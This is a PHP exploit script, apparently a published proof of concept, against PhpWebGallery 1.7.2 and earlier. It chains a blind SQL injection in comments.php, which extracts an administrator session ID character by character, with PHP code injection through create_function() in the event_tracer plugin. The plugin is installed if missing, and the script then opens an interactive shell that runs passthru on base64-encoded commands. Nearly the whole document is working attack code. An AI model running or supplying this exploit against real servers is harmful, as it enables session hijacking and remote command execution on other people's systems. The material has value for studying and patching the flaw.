&lt;?php

/*
	------------------------------------------------------------------------
	PhpWebGallery &lt;= 1.7.2 Remote Session Hijacking / Code Execution Exploit
	------------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.phpwebgallery.net/
	details..: works with at least two rows in _comments table
	
	This PoC was written for educational purpose. Use it at your own risk.
	Author will be not responsible for any damage.
	
	[-] vulnerable code in /plugins/event_tracer/event_list.php
	
	60.	$sort= isset($_GET[&#039;sort&#039;]) ? $_GET[&#039;sort&#039;] : 1;
	61.	usort(
	62.	  $events,
	63.	  create_function( &#039;$a,$b&#039;, &#039;return $a[&#039;.$sort.&#039;]&gt;$b[&#039;.$sort.&#039;];&#039; )
	64.	  );
	
	An attacker could be able to inject and execute PHP code through $_GET[&#039;sort&#039;], that is passed
	to create_function() at line 63 (see http://www.securityfocus.com/bid/31398). Only admin can
	access to the plugins management interface, but the attacker might be able to retrieve a valid
	admin session id using the SQL injection bug in comments.php (see lines 325-340)
*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;,5);

define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));
define(PATTERN, &quot;/&lt;span class=\&quot;author\&quot;&gt;(.*)&lt;\/span&gt; -/&quot;);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...\n&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function check_target()
{
	global $host, $path, $prefix, $default_record;
	
	$packet  = &quot;GET {$path}comments.php?sort_by=%s HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Cookie: pwg_id=&quot;.md5(&quot;foo&quot;).&quot;\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;

	preg_match(&quot;/FROM (.*)image_category/&quot;, http_send($host, sprintf($packet, &quot;foo&quot;)), $match);
	$prefix = $match[1];
	
	preg_match(PATTERN, http_send($host, sprintf($packet, &quot;id/**/LIMIT/**/1/*&quot;)), $match);
	$default_record = $match[1];
	
	preg_match(PATTERN, http_send($host, sprintf($packet, &quot;author/**/LIMIT/**/1/*&quot;)), $match);
	if (!strlen($default_record) || $default_record == $match[1]) die(&quot;\n[-] Exploit failed...\n&quot;);
}

function encodeSQL($sql)
{
	for ($i = 0, $n = strlen($sql); $i &lt; $n; $i++) $encoded .= dechex(ord($sql[$i]));
	return &quot;CONCAT(0x{$encoded})&quot;;
}

function get_sid()
{
	global $host, $path, $prefix, $default_record;
	
	$chars = array_merge(array(0), range(48, 57), range(97, 102)); // 0-9 a-z
	$index = 1;
	$sid   = &quot;&quot;;
	
	$packet  = &quot;GET {$path}comments.php?sort_by=%s HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Cookie: pwg_id=&quot;.md5(&quot;foo&quot;).&quot;\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;
	
	print &quot;\n[-] Fetching admin SID: &quot;;
	
	while (!strpos($sid, chr(0)))
	{
		for ($i = 0, $n = count($chars); $i &lt;= $n; $i++)
		{
			if ($i == $n) die(&quot;\n\n[-] Exploit failed...try later!\n&quot;);
			
			$sql  = &quot;(SELECT/**/IF(ASCII(SUBSTR(id,{$index},1))={$chars[$i]},author,id)/**/FROM/**/{$prefix}sessions&quot;.
				&quot;/**/WHERE/**/data/**/LIKE/**/&quot;.encodeSQL(&quot;pwg_uid|i:1;&quot;).&quot;/**/LIMIT/**/1)/**/LIMIT/**/1/*&quot;;
					
			preg_match(PATTERN, http_send($host, sprintf($packet, $sql)), $match);	
			if ($match[1] != $default_record) { $sid .= chr($chars[$i]); print chr($chars[$i]); break; }
		}
		
		$index++;
	}
	
	print &quot;\n&quot;;
	return $sid;
}

function check_plugin()
{
	global $host, $path, $sid;
	
	$packet  = &quot;GET {$path}%s HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Cookie: pwg_id={$sid}\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;
	
	// check if the event_tracer plugin isn&#039;t installed
	if (preg_match(&quot;/not active/&quot;, http_send($host, sprintf($packet, &quot;admin.php?page=plugin&amp;section=event_tracer/event_list.php&quot;))))
	{
		http_send($host, sprintf($packet, &quot;admin.php?page=plugins&amp;plugin=event_tracer&amp;action=install&quot;));
		http_send($host, sprintf($packet, &quot;admin.php?page=plugins&amp;plugin=event_tracer&amp;action=activate&quot;));
	}	
}

print &quot;\n+---------------------------------------------------------------------------+&quot;;
print &quot;\n| PhpWebGallery &lt;= 1.7.2 Session Hijacking / Code Execution Exploit by EgiX |&quot;;
print &quot;\n+---------------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage...: php $argv[0] host path [sid]\n&quot;;
	print &quot;\nhost....: target server (ip/hostname)&quot;;
	print &quot;\npath....: path to PhpWebGallery directory&quot;;
	print &quot;\nsid.....: a valid admin session id\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];

check_target();

$sid = (isset($argv[3])) ? $argv[3] : get_sid();

check_plugin();

$code	 = &quot;0];}error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die;%%23&quot;;
$packet  = &quot;GET {$path}admin.php?page=plugin&amp;section=event_tracer/event_list.php&amp;sort={$code} HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Cookie: pwg_id={$sid}\r\n&quot;;
$packet .= &quot;Cmd: %s\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;

while(1)
{
	print &quot;\nphpwebgallery-shell# &quot;;
	$cmd = trim(fgets(STDIN));
	if ($cmd != &quot;exit&quot;)
	{
		$response = http_send($host, sprintf($packet, base64_encode($cmd)));
		preg_match(&quot;/_code_/&quot;, $response) ? print array_pop(explode(&quot;_code_&quot;, $response)) : die(&quot;\n[-] Exploit failed...\n&quot;);
	}
	else break;
}

?&gt;

